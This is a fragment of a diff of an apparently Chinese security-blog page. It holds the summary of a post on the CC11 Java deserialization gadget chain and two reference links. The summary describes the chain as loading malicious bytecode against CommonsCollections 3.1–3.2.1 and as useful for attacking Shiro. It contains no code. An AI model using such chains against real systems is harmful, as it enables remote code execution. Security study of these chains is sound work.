 <h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><p>作为 yso 官方当中并没有的链子，CC11 链同时也被叫做是 CC2 + CC6 链的结合体，我这里把它单独拉出来，主要是为了后续 Shiro 学习，以及很多其他反序列化的学习当中，可以将 CC11 链单独作为一个非常好用的链子来攻击。</p>
 <p>cc11 好用的原因主要是 能够像 cc2 一样加载恶意字节码，同时受影响的版本还是 CommonsCollections 3.1-3.2.1 这个版本相对 CommonsCollections 4.0 范围应该会更广一些。</p>
-<h2 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1536" >http://wjlshare.com/archives/1536<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://johnfrod.top/%e5%ae%89%e5%85%a8/monscollections3%e5%88%a9%e7%94%a8%e9%93%be%e5%88%86%e6%9e%90/" >https://johnfrod.top/%e5%ae%89%e5%85%a8/monscollections3%e5%88%a9%e7%94%a8%e9%93%be%e5%88%86%e6%9e%90/<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h2><p><a class="link" target="_blank" rel="noopener" href="http://wjlshare.com/archives/1536">http://wjlshare.com/archives/1536<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://johnfrod.top/%e5%ae%89%e5%85%a8/monscollections3%e5%88%a9%e7%94%a8%e9%93%be%e5%88%86%e6%9e%90/">https://johnfrod.top/%e5%ae%89%e5%85%a8/monscollections3%e5%88%a9%e7%94%a8%e9%93%be%e5%88%86%e6%9e%90/<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
